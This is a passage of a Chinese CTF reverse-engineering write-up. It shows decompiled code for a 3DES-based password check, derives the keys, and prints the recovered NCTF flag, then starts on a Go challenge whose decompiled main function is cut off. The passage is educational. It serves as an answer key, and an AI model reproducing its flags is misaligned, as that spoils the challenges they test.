class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1E30</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n; <span class="comment">// w20</span></span><br><span class="line">    <span class="type">int</span> v8; <span class="comment">// w0</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *s; <span class="comment">// x19</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span> *src; <span class="comment">// x22</span></span><br><span class="line">    __int64 *v11; <span class="comment">// x23</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *ptr; <span class="comment">// x21</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// w22</span></span><br><span class="line">    __int64 v14; <span class="comment">// x22</span></span><br><span class="line">    __int64 v15; <span class="comment">// x23</span></span><br><span class="line">    __int64 v16; <span class="comment">// x26</span></span><br><span class="line">    __int64 *s_1; <span class="comment">// x27</span></span><br><span class="line">    __int64 v18; <span class="comment">// x0</span></span><br><span class="line">    __int64 v19; <span class="comment">// x0</span></span><br><span class="line">    __int64 v20; <span class="comment">// x0</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *ptr_1; <span class="comment">// x9</span></span><br><span class="line">    __int64 n_1; <span class="comment">// x8</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *s_2; <span class="comment">// x10</span></span><br><span class="line">    <span class="type">int</span> v24; <span class="comment">// w11</span></span><br><span class="line">    <span class="type">int</span> v25; <span class="comment">// t1</span></span><br><span class="line">    <span class="type">int</span> v26; <span class="comment">// t1</span></span><br><span class="line"></span><br><span class="line">    n = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + <span class="number">1312LL</span>))(a1, a3);</span><br><span class="line">    v8 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + <span class="number">1312LL</span>))(a1, a3);</span><br><span class="line">    s = (<span class="type">unsigned</span> __int8 *)<span class="built_in">malloc</span>(v8 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, n + <span class="number">1</span>);</span><br><span class="line">    src = (<span class="type">const</span> <span class="type">void</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="number">1352LL</span>))(a1, a3, <span class="number">0LL</span>);</span><br><span class="line">    v11 = (__int64 *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="number">1472LL</span>))(a1, a4, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(s, src, n);</span><br><span class="line">    ptr = (<span class="type">unsigned</span> __int8 *)<span class="built_in">malloc</span>(<span class="number">0x20u</span>LL);</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    *(_OWORD *)ptr = xmmword_1804;</span><br><span class="line">    *((_OWORD *)ptr + <span class="number">1</span>) = unk_1814;</span><br><span class="line">    <span class="keyword">if</span> ( (n &amp; <span class="number">7</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n &gt;= <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v14 = *v11;</span><br><span class="line">            v15 = v11[<span class="number">1</span>];</span><br><span class="line">            v16 = (<span class="type">unsigned</span> <span class="type">int</span>)n &gt;&gt; <span class="number">3</span>;</span><br><span class="line">            s_1 = (__int64 *)s;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                v18 = en_3des(*s_1, v14);</span><br><span class="line">                v19 = de_3des(v18, v15);</span><br><span class="line">                v20 = en_3des(v19, v14);</span><br><span class="line">                *s_1++ = v20;</span><br><span class="line">                __android_log_print(<span class="number">3</span>, <span class="string">&quot;native&quot;</span>, <span class="string">&quot;%llx&quot;</span>, v20);</span><br><span class="line">                --v16;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v16 );</span><br><span class="line">        &#125;</span><br><span class="line">        ptr_1 = ptr;</span><br><span class="line">        <span class="keyword">if</span> ( n &lt;= <span class="number">0</span> )</span><br><span class="line">            n_1 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            n_1 = (<span class="type">unsigned</span> <span class="type">int</span>)n;</span><br><span class="line">        s_2 = s;</span><br><span class="line">        <span class="keyword">while</span> ( n_1 )</span><br><span class="line">        &#123;</span><br><span class="line">            v25 = *ptr_1++;</span><br><span class="line">            v24 = v25;</span><br><span class="line">            v26 = *s_2++;</span><br><span class="line">            --n_1;</span><br><span class="line">            <span class="keyword">if</span> ( v24 != v26 )</span><br><span class="line">            &#123;</span><br><span class="line">                v13 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v13 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LABEL_13:</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    <span class="keyword">return</span> v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(可以看s盒来判断加密类型)逻辑就是3des加密，加密结果和xmmword_1804验证，大概是24字节，a1,a2参数是固定的,a3,a4就是传入的两个参数，所以不难猜出key就是账户的Md5，值得注意的是v11类型是__int64，8字节存储，所以会大小端序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__int64 a = <span class="number">0x7d53ecd36a43d3d2</span>;</span><br><span class="line">__int64 b = <span class="number">0x37e7dd633dcf8497</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, a &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, b &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>en_key&#x3D;d2d3436ad3ec537d</p><p>de_key&#x3D;9784cf3d63dde737</p><p>密文：0x8BA584B886EC9E40 0xBBB8D31AE2648A7E 0x523E454612FA4BDF</p><p>直接CyberChef选择Triple DES Decrypt</p><p>获得~DWPefaS+MY?x$y5&#x3D;6mG50U5，这个也要大小端序转换因为输入的时候Safe-&gt;</p><p>S</p><p>a</p><p>f</p><p>e</p><p>0xefaS相当于是这样，所以解密出来的就是上面这样，转换后SafePWD~5y$x?YM+5U05Gm6&#x3D;</p><p>NCTF{X1c@dM1n1$t_SafePWD~5y$x?YM+5U05Gm6&#x3D;}</p><h2 id="gogogo-复现"><a href="#gogogo-复现" class="headerlink" title="gogogo(复现)"></a>gogogo(复现)</h2><p>第一次做go题，很遗憾，就差一点就有了，拖进ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.main</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r11d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r11d</span></span><br><span class="line">  __int64 v11; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r11d</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r11d</span></span><br><span class="line">  main_coroutVM *p_main_coroutVM; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// r10d</span></span><br><span class="line">  __int64 *v22; <span class="comment">// r11</span></span><br><span class="line">  __m128i *ptr_1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> *instr; <span class="comment">// rcx</span></span><br><span class="line">  __m128i *checkres; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *instrSet; <span class="comment">// rsi</span></span><br><span class="line">  main_coroutVM *inputl; <span class="comment">// rax</span></span><br><span class="line">  __int64 v28; <span class="comment">// rcx</span></span><br><span class="line">  __int64 *v29; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">void</span> *instr_1; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">void</span> *checkres_1; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">void</span> *instrSet_1; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> p_string_1; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">size_t</span> len_1; <span class="comment">// rdx</span></span><br><span class="line">  main_coroutVM *p_main_coroutVM_2; <span class="comment">// rsi</span></span><br><span class="line">  uint8 *mem; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD *v37; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// r10d</span></span><br><span class="line">  main_coroutVM **v41; <span class="comment">// r11</span></span><br><span class="line">  __int64 inputh; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v43; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v44; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v47; <span class="comment">// r11d</span></span><br><span class="line">  _QWORD *v48; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v50; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v51; <span class="comment">// r10d</span></span><br><span class="line">  main_coroutVM **v52; <span class="comment">// r11</span></span><br><span class="line">  __int64 inputl_2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v54; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v55; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v57; <span class="comment">// r11d</span></span><br><span class="line">  __int64 instr_4; <span class="comment">// rcx</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  __int64 v60; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v61; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v62; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v63; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v64; <span class="comment">// r11d</span></span><br><span class="line">  <span class="type">int</span> v65; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v66; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v67; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v68; <span class="comment">// r11d</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v69; <span class="comment">// cl</span></span><br><span class="line">  __int64 v70; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v71; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v72; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v73; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">int</span> v74; <span class="comment">// r11d</span></span><br><span class="line">  __int64 v75; <span class="comment">// r8</span></span><br><span class="line">  __int64 v76; <span class="comment">// [rsp-3Ah] [rbp-E0h]</span></span><br><span class="line">  __int64 v77; <span class="comment">// [rsp-3Ah] [rbp-E0h]</span></span><br><span class="line">  __int64 v78; <span class="comment">// [rsp-3Ah] [rbp-E0h]</span></span><br><span class="line">  __int64 v79; <span class="comment">// [rsp-32h] [rbp-D8h]</span></span><br><span class="line">  __int64 v80; <span class="comment">// [rsp-32h] [rbp-D8h]</span></span><br><span class="line">  __int64 v81; <span class="comment">// [rsp-32h] [rbp-D8h]</span></span><br><span class="line">  __int64 v82; <span class="comment">// [rsp-2Ah] [rbp-D0h]</span></span><br><span class="line">  __int64 v83; <span class="comment">// [rsp-22h] [rbp-C8h]</span></span><br><span class="line">  __int64 v84; <span class="comment">// [rsp-1Ah] [rbp-C0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v85; <span class="comment">// [rsp+0h] [rbp-A6h]</span></span><br><span class="line">  <span class="type">int</span> v86; <span class="comment">// [rsp+1h] [rbp-A5h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v87; <span class="comment">// [rsp+5h] [rbp-A1h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// [rsp+6h] [rbp-A0h]</span></span><br><span class="line">  __int64 i_1; <span class="comment">// [rsp+Eh] [rbp-98h]</span></span><br><span class="line">  __int64 instr_3; <span class="comment">// [rsp+16h] [rbp-90h]</span></span><br><span class="line">  main_coroutVM *inputl_1; <span class="comment">// [rsp+1Eh] [rbp-88h]</span></span><br><span class="line">  __int64 instr_2; <span class="comment">// [rsp+26h] [rbp-80h]</span></span><br><span class="line">  main_coroutVM *p_main_coroutVM_1; <span class="comment">// [rsp+2Eh] [rbp-78h]</span></span><br><span class="line">  __int64 checkres_2; <span class="comment">// [rsp+36h] [rbp-70h]</span></span><br><span class="line">  __m128i *_RSI_1; <span class="comment">// [rsp+3Eh] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+46h] [rbp-60h]</span></span><br><span class="line">  _QWORD v97[<span class="number">2</span>]; <span class="comment">// [rsp+4Eh] [rbp-58h] BYREF</span></span><br><span class="line">  _QWORD v98[<span class="number">2</span>]; <span class="comment">// [rsp+5Eh] [rbp-48h] BYREF</span></span><br><span class="line">  _QWORD v99[<span class="number">2</span>]; <span class="comment">// [rsp+6Eh] [rbp-38h] BYREF</span></span><br><span class="line">  _QWORD v100[<span class="number">2</span>]; <span class="comment">// [rsp+7Eh] [rbp-28h] BYREF</span></span><br><span class="line">  _QWORD v101[<span class="number">2</span>]; <span class="comment">// [rsp+8Eh] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="built_in">string</span> *p_string; <span class="comment">// [rsp+9Eh] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  instr_2 = runtime_makechan(&amp;RTYPE_chan__4_uint8, <span class="number">0</span>);</span><br><span class="line">  instr_3 = runtime_makechan(&amp;RTYPE_chan__4_uint8, <span class="number">0</span>);</span><br><span class="line">  checkres_2 = runtime_makechan(&amp;RTYPE_chan_bool, <span class="number">2</span>);</span><br><span class="line">  p_string = runtime_newobject(&amp;RTYPE_string, <span class="number">2LL</span>, v2, v0, v1, v3, v4, v5, v6);</span><br><span class="line">  v101[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">  v101[<span class="number">1</span>] = &amp;off_2B8B08;</span><br><span class="line">  fmt_Fprintln(off_2B9218, qword_350000, v101, <span class="number">1</span>, <span class="number">1</span>, v7, v8, v9, v10, v76, v79);</span><br><span class="line">  v100[<span class="number">0</span>] = &amp;RTYPE__ptr_string;</span><br><span class="line">  v100[<span class="number">1</span>] = p_string;</span><br><span class="line">  v11 = qword_34FFF8;</span><br><span class="line">  fmt_Fscanf(</span><br><span class="line">    off_2B9238,</span><br><span class="line">    qword_34FFF8,</span><br><span class="line">    &amp;a0ILm51YSiTvrru[<span class="number">19</span>],</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    v100,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    v12,</span><br><span class="line">    v13,</span><br><span class="line">    v77,</span><br><span class="line">    v80,</span><br><span class="line">    v82,</span><br><span class="line">    HIDWORD(v82),</span><br><span class="line">    v83,</span><br><span class="line">    HIDWORD(v83),</span><br><span class="line">    v84,</span><br><span class="line">    HIDWORD(v84));</span><br><span class="line">  ptr = p_string-&gt;ptr;</span><br><span class="line">  len = p_string-&gt;len;</span><br><span class="line">  p_main_coroutVM = runtime_newobject(&amp;RTYPE_main_coroutVM, v11, len, <span class="number">2</span>, v100, v14, v15, v16, v17);</span><br><span class="line">  ptr_1 = &amp;qword_395420;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    ptr_1 = ptr;</span><br><span class="line">  <span class="keyword">if</span> ( dword_395690 )</span><br><span class="line">  &#123;</span><br><span class="line">    p_main_coroutVM = runtime_gcWriteBarrier2(p_main_coroutVM);</span><br><span class="line">    instr = instr_2;</span><br><span class="line">    *v22 = instr_2;</span><br><span class="line">    checkres = checkres_2;</span><br><span class="line">    v22[<span class="number">1</span>] = checkres_2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    instr = instr_2;</span><br><span class="line">    checkres = checkres_2;</span><br><span class="line">  &#125;</span><br><span class="line">  _RSI_1 = ptr_1;</span><br><span class="line">  p_main_coroutVM-&gt;instr = instr;</span><br><span class="line">  p_main_coroutVM-&gt;checkres = checkres;</span><br><span class="line">  instrSet = ::instrSet;</span><br><span class="line">  <span class="keyword">if</span> ( dword_395690 )</span><br><span class="line">  &#123;</span><br><span class="line">    p_main_coroutVM = runtime_gcWriteBarrier1(p_main_coroutVM, checkres, instr, <span class="number">2LL</span>, ::instrSet);</span><br><span class="line">    *v22 = instrSet;</span><br><span class="line">  &#125;</span><br><span class="line">  p_main_coroutVM_1 = p_main_coroutVM;</span><br><span class="line">  p_main_coroutVM-&gt;instrSet = instrSet;</span><br><span class="line">  inputl = runtime_newobject(&amp;RTYPE_main_coroutVM, checkres, instr, <span class="number">2</span>, instrSet, v19, v20, v21, v22);</span><br><span class="line">  <span class="keyword">if</span> ( dword_395690 )</span><br><span class="line">  &#123;</span><br><span class="line">    inputl = runtime_gcWriteBarrier2(inputl);</span><br><span class="line">    instr_1 = instr_3;</span><br><span class="line">    *v29 = instr_3;</span><br><span class="line">    checkres_1 = checkres_2;</span><br><span class="line">    v29[<span class="number">1</span>] = checkres_2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    instr_1 = instr_3;</span><br><span class="line">    checkres_1 = checkres_2;</span><br><span class="line">  &#125;</span><br><span class="line">  inputl-&gt;instr = instr_1;</span><br><span class="line">  inputl-&gt;checkres = checkres_1;</span><br><span class="line">  instrSet_1 = instrSet_0;</span><br><span class="line">  <span class="keyword">if</span> ( dword_395690 )</span><br><span class="line">  &#123;</span><br><span class="line">    inputl = runtime_gcWriteBarrier1(inputl, checkres, v28, <span class="number">2LL</span>, instrSet);</span><br><span class="line">    *v29 = instrSet_1;</span><br><span class="line">  &#125;</span><br><span class="line">  inputl-&gt;instrSet = instrSet_1;</span><br><span class="line">  p_string_1 = p_string;</span><br><span class="line">  <span class="keyword">if</span> ( p_string-&gt;len == <span class="number">40</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    len_1 = len;</span><br><span class="line">    <span class="keyword">if</span> ( len &gt;= <span class="number">20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      